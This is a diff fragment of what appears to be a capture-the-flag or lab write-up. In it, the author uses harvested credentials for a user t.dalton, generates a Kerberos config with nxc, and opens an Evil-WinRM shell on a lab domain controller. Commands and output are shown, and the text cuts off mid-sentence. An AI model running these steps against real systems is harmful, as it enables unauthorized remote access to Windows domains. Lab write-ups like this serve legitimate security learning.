@@ -601,5 +601,35 @@ export KRB5CCNAME=t.dalton.ccache
 ```
 
 ```python
-
+sudo nxc smb dc.northstone.local -u t.dalton -p '123tonyd' --generate-krb5-file /etc/krb5.conf
+[sudo] password for kali: 
+SMB         10.1.209.181    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:northstone.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.1.209.181    445    DC               [+] krb5 conf saved to: /etc/krb5.conf
+SMB         10.1.209.181    445    DC               [+] Run the following command to use the conf file: export KRB5_CONFIG=/etc/krb5.conf
+SMB         10.1.209.181    445    DC               [+] northstone.local\t.dalton:123tonyd 
 ```
+
+```python
+export KRB5_CONFIG=/etc/krb5.conf
+```
+
+After running these commands i should now be able to access WINRM
+
+```python
+evil-winrm -i dc.northstone.local -u t.dalton -r northstone.local 
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Warning: User is not needed for Kerberos auth. Ticket will be used
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\t.dalton\Documents>
+```
+
+I now have access
+
+Now going back t
